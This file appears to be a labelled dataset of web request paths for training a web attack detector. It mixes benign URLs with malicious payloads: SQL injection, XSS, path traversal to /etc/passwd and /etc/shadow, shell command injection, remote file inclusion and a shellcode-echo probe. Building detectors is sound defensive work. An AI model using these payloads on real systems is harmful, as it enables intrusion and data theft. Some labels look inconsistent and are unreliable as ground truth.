request	label
/ string / str =  $  ( echo qofxcy )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & 	1
/ string / strings / parameters = verrilli 	0
/ string / strings / parameters = 5385467629611173 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ vorstandsberichte_drucken / 	0
/ airtravelfoia / 	0
/ thinbasic / 	0
/ string / modo = entrar & login = yale & pwd = 2ncoja7 & remember = on '  + delete + from + users & b1 = entrar 	1
/ registry-booster / 	0
/ s7qus4g3 . fts ?  < script > cross_site_scripting . nasl <  / script > 	1
/ anime-seal / 	0
/ string / strings / parameters = 37541 	0
"/ string / strings / parameters = 1 ""  ""  )  and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  ""  "" zyeo ""  ""  like  ""  "" zyeo "	1
/ string / strings / parameters = romer @ pisossantcugat . iq 	0
/ string / strings / parameters = cardenal mendoza s / n ,  7 ? h 	0
/ string / strings / parameters = '  |  | utl_inaddr . get_host_name (  ( select + user + from + dual )  ) 	1
/ javascript / 04 . doc 	0
/ msg675695 / 	0
/ examples / jsp / colors / coin_includes / constants . php ? _ccfg [ _pkg_path_incl ]  =  / etc / passwd \ x00 	1
"/ help . php ? q =  ""  \ x0duname \ x09 > q93881688 \ x09 # "	1
/ string / strings / parameters = 3581640568970302 	0
/ top . php ? stuff =  '  \ x0arm q13387342  # 	1
/ main . php ? stuff =  '  \ x0asleep \ x097 \ x09 # 	1
/ javascript / trailers . msg 	0
/ warbears_feat / 	0
/ cheaptrial / 	0
/ string / strings / parameters = l1am217r5 	0
/ javascript / meta . exe 	1
/ shortstory / 	0
/ phpmyadmin / main . php ? g2_itemid =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / license \ x00 	1
"/ help . php ? q =  ""  \ x0drm q75726259  # "	1
/ javascript / int . tpl 	0
/ rss_home / 	0
/ string / strings / parameters = -9024 )  where 1686 = 1686 or 3069 = 8213 -- 	1
/ javascript / callin . save 	0
/ javascript / cfdocs . bak 	0
"/ weq93ppb . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ p54-11 / 	0
/ string / strings / parameters = 1 '  where 8128 = 8128 ; select  *  from generate_series ( 2317 , 2317 , case when  ( 2317 = 9706 )  then 1 else 0 end )  limit 1 -- 	1
/ string / id = 2 & nombre = jamn + ibrico & precio = 85 & cantidad = 12 & b1 = aadir + al + carrito 	0
/ cgevallx / 	0
/ willie nelson / 	0
/ 3887493 / 	0
"/ login . php ? req =  ""  >  < script > alert (  ' testlink_login_req_param_xss . nasl-1331908833 '  )  <  / script > "	1
/ xfkun1ku . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ javascript / viewsource . war 	0
/ scripts / index . php ? src = 1 & _common = 1 & time = 1332010405 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo kzpzzi )   &  &  str1 =  $  {  # str }   &  &   [  9 -eq  $  { str1 }   ]   &  &  sleep 1  ' 	1
/ string / strings / parameters = -8504 where 3086 = 3086 or 1131 = 9188 # 	1
/ main . php ? stuff =  & ver \ x0b > q16761326 & rem \ x0b 	1
/ articles_publications / 	0
/ cacti / index2 . cgi ? frames = yes & board = demo & mode = current & threads = collapse & message =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = < script src =  "" http :  /  / ha . ckers . org / xss . jpg ""  >  <  / script > "	1
/ giveituptome / 	0
/ string / strings / parameters = 4140359172053437 	0
"/ string / strings / parameters = 1 ""  ""  )  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  (  ""  "" ykhp ""  ""  like  ""  "" ykhp "	1
/ string / strings / parameters = fortner 	0
/ javascript / keep . ppt 	0
/ 000091407 / 	0
/ main . php ? logout = ver \ x0b > q69125734 & rem \ x0b 	1
/ topbannersitetitle5 / 	0
"/  "" rss + security ""  / "	1
/ string / modo = registro & login = boisvert & password = ma27ta & nombre = paladio & apellidos = d ' amico + urrea & email = mcnear . trotta @ lettere . ve & dni = 11295198j & direccion = robert + graves ,  + 101 +  & ciudad = casillas + de + flores & cp = 50300 & provincia = madrid & ntc = 1889610781907232 & b1 = registrar 	0
/ bb-hostsvc . sh ? hostsvc =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ phpmyadmin / wa . exe ? debug-show-version 	1
/ string / strings / parameters = -4803 %  '  )  )  or 8571 = 8571 -- 	1
/ javascript / home . trace 	0
/ string / modo = registro & login = rodschat & password = 5mp1o0isad65 & nombre = tarcisio & apellidos = merlach + corminas & email = azar @ archivodeimagenes . eu & dni = 63154198q & direccion = carlos + balenchana + 83 ,  +  & ciudad = lechn & cp = 24882 & provincia = girona & ntc = 928497527479202a & b1 = registrar 	1
"/ string / strings / parameters = ""  &  & echo $ ifswjrxoq $  (  ( 50 + 45 )  )  $  ( echo $ ifswjrxoq ) wjrxoq /  / "	1
/ string / modo = registro & login = winona & password = picn & nombre = nayla & apellidos = torre + xu & email = hyer_longdon0 @ artforall . mc & dni = 83627503d '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & direccion = calle + corbina ,  + 100 +  & ciudad = hornillos + de + cameros & cp = 46691 & provincia = cuenca & ntc = 5175565918974704 & b1 = registrar 	1
/ addpost_newpoll . php ? addpoll = preview & thispath = http :  /  / cirt . net / rfiinc . txt ? 	0
/ string / strings / parameters = 1 '  in boolean mode )  ; select dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 70 )  |  | chr ( 106 )  |  | chr ( 78 )  , 5 )  from dual -- 	1
/ ecofin / 	0
"/ top . php ? stuff =  "" rm \ x0bq81585151 & rem \ x0b "	1
/ string / strings / parameters = '   str =  $  ( echo fyhgfl )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  / 	1
/ string / strings / parameters = 2935 	0
"/ azcrfs8d . aspx ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
/ lineid / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  union all select null , null , null , null , null # "	1
/ touring / 	0
"/ 5o9zq43e . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = < img style =  "" xss : expr /  * xss *  / ession ( confirm ( document . location )  )  ""  > "	1
/ string / strings / parameters = alessandro 	0
/ edzaia0i . cfm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ examples / jsp / jsp2 / el / webspirs . cgi ? sp . nextform =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 4085822319269290 	0
/ string / modo = entrar & login = kwok & pwd = a6lastam2en4o & remember = on & b1 = entrar 	0
"/ q703m78q . kspx ?  < meta http-equiv = set-cookie content =  "" testvowq = 604 ""  > "	1
/ string / strings / parameters = -2734 '  )  union all select 5510 , 5510 , 5510 , 5510 , 5510 # 	1
/ services_json / 	0
/ string / modo = entrar & login = yoon & pwd = re53nc19g93s8 & remember = on & b1 = entrar 	0
"/ i7prbs22 . html ?  < script > document . cookie =  "" testjnre = 7328 ;  ""  <  / script > "	1
/ javascript / pub . gif 	0
"/ w4996nr0 . idc ?  < script > document . cookie =  "" testttvs = 7163 ;  ""  <  / script > "	1
/ b000bobgui / 	0
/ cgi / c32web . exe / changeadminpassword 	1
/ string / modo = registro & login = giuliett5 & password = 2an6 ' 2 / 0a & nombre = ronald & apellidos = sanz & email = stantley @ apagado . com . cn & dni = 95645025p & direccion = modolell + 91 ,  + 9-f & ciudad = huneja & cp = 27532 & provincia = crdoba & ntc = 2095402287087000 & b1 = registrar 	1
/ vietcong 2_information / 	0
/ string / strings / parameters = angelika 	0
/ string / strings / parameters = 1 )  where 9645 = 9645 union all select null , null , null -- 	1
/ ms02-039 / 	0
/ string / strings / parameters = bu0ar4 	0
"/ string / strings / parameters = & lt ; img lowsrc =  \  "" javascript &  # 058 ; alert (  ' xss '  )  \  ""  & gt ; "	1
/ childrenscollections / 	0
/ javascript / space . exe 	1
/ dl6111 / 	0
/ otlogo / 	0
/ 20030710-6 / 	0
/ javascript / operations . php 	0
"/ string / id = 1 & nombre =  ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  <  & precio = 100 & cantidad = 15 & b1 = aadir + al + carrito "	1
/ scripts / setcookie . php ? u =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & plugin = pblang_mult_flaws . nasl 	1
/ x-ways / 	0
/ javascript / disclaimer . xsl 	0
"/ h4bi26jd . x ?  < meta http-equiv = set-cookie content =  "" testhrzx = 1150 ""  > "	1
/ string / strings / parameters = lugar los morros ,  50 ,  9 ? c 	0
/  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  .  \  /  \  .  \  { file } 	1
/ string / strings / parameters = < script src =  %  ( jscript ) s >  <  / script > 	1
/ javascript / sling . phtml 	0
/  % uff0e % uff0e \  { file } 	1
/ butback / 	0
/ icon_wizards / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 39any ?  set-cookie :  + tamper = 5765205567234876235 & cantidad = 26 & b1 = aadir + al + carrito 	1
"/ en-us /  < script > document . cookie =  "" testfutf = 1550 ;  ""  <  / script > "	1
/ string / strings / parameters = |   [  5 -ne  $  ( echo awkjgv  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1 	1
/ string / modo = insertar & precio = 6525 & b1 = pasar + por + caja / 	1
/ netflowsysreq / 	0
/ examples / jsp / cal / webspirs . cgi ? sp . nextform =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ windowless1 / 	0
/ string / strings / parameters = 1 '  )  )  as mbzk where 9153 = 9153 and 2006 = 2006 	1
/ contestant_appform / 	0
/ cgi-home / sendform . cgi 	0
/ examples / jsp / checkbox / lib / authform . inc . php ? path_pre =  / etc / passwd \ x00 	1
"/ string / id =  ""  >  <  !  --  # exec + cmd =  "" dir +  ""  --  >  <  & nombre = vino + rioja & precio = 85 & cantidad = 60 & b1 = aadir + al + carrito "	1
/ cgi-local / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / modo = entrar & login = konstanc & pwd = escenogrfica & remember = off & b1 = entrar 	0
"/ lmw4r201 . htm ?  < script > document . cookie =  "" testwews = 8477 ;  ""  <  / script > "	1
/ string / strings / parameters = ' echo ggrvqx $  (  ( 86 + 56 )  )  $  ( echo ggrvqx ) ggrvqx /  / 	1
"/ q703m78q . html ?  < meta http-equiv = set-cookie content =  "" testvowq = 604 ""  > "	1
/ string / strings / parameters = 1 where 4844 = 4844 ; select case when 3252 = 9622 then 1 else null end -- 	1
/ ebo_smith / 	0
/ string / strings / parameters = 1 '  )  as noqp where 4042 = 4042 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  -- 	1
/ cgi-home / fileseek . cgi ? foot =  & head =  ; cat  / etc / passwd | 	1
/ string / strings / parameters = callos 	0
/ garouchase / 	0
/ blogcms / index . php ? dir_plugins = xxpathxx ? 	1
/ firemoutheggs_tn / 	0
/ string / str =  $  ( echo ikkweg )   str1 =  $  {  # str }   if  [  7 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  # 	1
/ warehouse1 / 	0
/ string / modo = entrar & login = aloin & pwd = 037r20n0do & remember = off & b1 = entrar 	0
/ winrar / 	0
/ examples / jsp / sessions / cgiip . exe / wservice = wsbroker1 / webutil / ping . p 	1
/ industryspot / 	0
/ string / strings / parameters = jocs olimpics 110 1-b 	0
/ idisclaimer / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fokdal )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  \  \ 	1
/ string / strings / parameters = 1 )  where 7026 = 7026 ; call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- 	1
/ string / strings / parameters = < embed src =  /  onload = alert ( 5 )  > 	1
/ staatscourant / 	0
/ string / strings / parameters = 1 )  as tkkn where 7832 = 7832  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  -- 	1
/ 239434 / 	0
/ string / modo = registro & login = tamer & password = el * e0toral & nombre = floreal & apellidos = mio + odena & email = espinosa @ chicashumedas . net & dni = 81338514a & direccion = avenida + baraain ,  + 51 ,  + 1 ? h & ciudad = seplveda & cp = 22587 & provincia = tarragona & ntc = 7133903529620631 & b1 = registrar 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as thoj where 1577 = 1577 or char ( 75 )  |  | char ( 70 )  |  | char ( 99 )  |  | char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  -- "	1
/ string / strings / parameters = 1 %  '  and 2006 = 2006 	1
/ string / modo = registro & login = roanne & password = 3un09o & nombre = odila & apellidos = bologna & email = prendes @ gia . com . kp & dni = 79531407y & direccion = calle + sor + eulalia ,  + s / n +  & ciudad = pirnigas & cp = 34447 & provincia = madrid & ntc = 381155247297248 & b1 = registrar 	1
/ vquip9psac6fvr / 	0
/ string / strings / parameters = guillem paip 	0
/ javascript / alpha . dump 	0
/ string / strings / parameters = '  ; echo nucrtg $  (  ( 61 + 63 )  )  $  ( echo nucrtg ) nucrtg ' 	1
/ string / strings / parameters = < svg / onload = location = name /  / �? > click <  / a > 	1
/ bulletin_small / 	0
/ string / strings / parameters = 1 '  where 9241 = 9241 or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ meekernews2-tm / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  as oiqr where 4073 = 4073 or 8156 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  -- "	1
/ string / id = 1 & nombre = jamn + ibrico & precio = 39 & cantidad = 91 & b1 = aadir + al + carrito 	0
/ security_advisories / 	0
/ string / modo = registro & login = fetzko & password = gauchaje & nombre = naimi & apellidos = artigas + girut & email = sheffield @ ringringrent . my & dni = 86274990n & direccion = tharsis + s / n + 11 ? c & ciudad = collado + villalba & cp = 17740 & provincia = navarra & ntc = 4085822319269290 & b1 = registrar 	0
/ 781573 / 	0
/ rcsuserinfo / 	0
/ gta2_trainer2 / 	0
/ star_ball / 	0
/ javascript / opendir . dat 	0
/ index20061220 / 	0
"/ eg2u8pbv . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = ' print (  ` echo cvfeyy \ necho  $  (  ( 56 + 86 )  )  \ necho cvfeyy \ necho cvfeyy `  )  ;  /  / cvfeyy 	1
"/ if69ddo1 . cfm ?  < meta http-equiv = set-cookie content =  "" testiabz = 5220 ""  > "	1
"/ scs86g1p . fts ?  < script > document . cookie =  "" testquyx = 2820 ;  ""  <  / script > "	1
/ scripts / search . php ? allwords =  < br >  < script > foo <  / script >  & cid = 0 & title = 1 & desc = 1 	1
/ 149211 / 	0
/ main . php ? stuff =  '  \ x0arm q75819271  # 	1
/  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / shadow 	1
/ string / strings / parameters = 1 '  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  and  (  ' tnvm '  like  ' tnvm 	1
/ string / id = 1 & nombre = ques + o + manchego & precio = 39 & cantidad = 42 & b1 = aadir + al + carrito 	1
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + 5b + e8 + 57 + 00 + 00 + 00 + 01 + d3 + 5e + 5a + 5f + 58 + ff + e3 + e8 + ed + ff + ff + ff + 7f + e9 + f4 + 09 + 57 + 69 +  +  >  > esbq "	1
"/ top . php ? stuff =  ""  & del q19468613 & rem "	1
"/ string / strings / parameters = ;  str =  $  ( echo jbuktb )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "" "	1
/ string / strings / parameters = 31270 	0
/ halcyon_cove / 	0
/ string / id = 1 /  & nombre = vino + rioja & precio = 100 & cantidad = 92 & b1 = aadir + al + carrito 	1
/ string / strings / parameters = password :  *  /  = 1 -- 	1
/ 114528589060399840 / 	0
"/ string / strings / parameters = ""   str =  $  ( echo sfurkw )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  & "	1
/ examples / servlets / servlet / news . php ? prevnext = 1 ' phpnews_prevnext_sql_injection . nasl 	1
/ rss_whatis / 	0
/ networkcomputing-fw / 	0
"/ vwmg565s . kspx ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 0w155a7c . nsf ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = 1 '  |  |  ( select  ' aevx '  from dual where 9999 = 9999 ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  )  |  |  ' 	1
/ string / strings / parameters = 1 '  )  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) srmq )  and  (  ' pags '  =  ' pags 	1
/ cgi-bin / settings / site . ini 	0
/ string / strings / parameters = 1 '  )  as lgex where 4068 = 4068 and 1378 = 9247 -- 	1
/ script / init / createallimagecache . php ? path_to_code = http :  /  / cirt . net / rfiinc . txt ? 	1
/ javascript / _common . shtml 	0
/ eclipse-spyder / 	0
/ safetytips / 	0
/ examples / jsp / sessions / index . php ? template =  .  .  /  .  .  /  .  .  / loudblog / custom / config . php \ x00 	1
/ manual / ja / platform / windows . html 	0
/ internetexplorer7tipps / 	0
"/ help . php ? q =  "" rm q26428197 & rem "	1
"/ string / strings / parameters = 1 ""  ""  and elt ( 4249 = 4249 , 7259 )  and  ""  "" kgtz ""  ""  like  ""  "" kgtz "	1
/ evangelion5-8 / 	0
/ cs97hack / 	0
"/ string / strings / parameters = -7122 ""  ""  )  union all select 4002 , 4002 , 4002 , 4002 , 4002 , 4002 , 4002 , 4002 # "	1
/ death_toll / 	0
/ string / strings / parameters = �? >  >  <  < img src = x onerror = alert ( 1 )  ;  /  /  >  >  ; 	1
"/ en-us / n9xlumt5 . nsf ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
